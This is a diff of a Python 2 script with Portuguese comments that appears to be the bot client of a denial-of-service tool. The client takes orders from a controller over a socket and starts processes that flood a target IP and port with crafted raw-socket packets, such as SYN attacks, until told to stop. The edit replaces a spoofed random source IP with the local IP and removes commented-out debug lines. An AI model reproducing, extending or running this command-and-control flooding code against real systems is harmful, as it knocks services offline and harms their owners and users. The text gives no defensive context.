@@ -170,12 +170,8 @@ def montaPacote(seqnumber,attack_type,source_ip, dest_ip, source_port, dest_port
 def receivemessage(socket):
     data = socket.recv(1024)
     if not data :
-        #print 'Connection closed'
         sys.exit()
-    else :
-        #print data
-        #sys.stdout.write("Server Response: " + data)
-        return data
+    return data
 
 def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
     print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
@@ -239,7 +235,7 @@ else:
                 dest_port = data2.split()[3]
                 # Novo processo para ataque
                 try:
-                    proc = Process(target=attack,args=(raw_s,attack_type,get_random_ip(),dest_ip,dest_port))
+                    proc = Process(target=attack,args=(raw_s,attack_type,local_ip,dest_ip,dest_port))
                     proc.start()
                     signal = receivemessage(s)
                     if signal.rstrip() == "stop":
@@ -247,8 +243,6 @@ else:
                         print "======= Stop attacking! ========="
                 except:
                     print "Error: unable to start process"
-
-                #attack(raw_s,"SYN",local_ip,dest_ip,dest_port)
             # Comando de parada sem estar atacando
             if data2 == "stop":
                 alive = 1
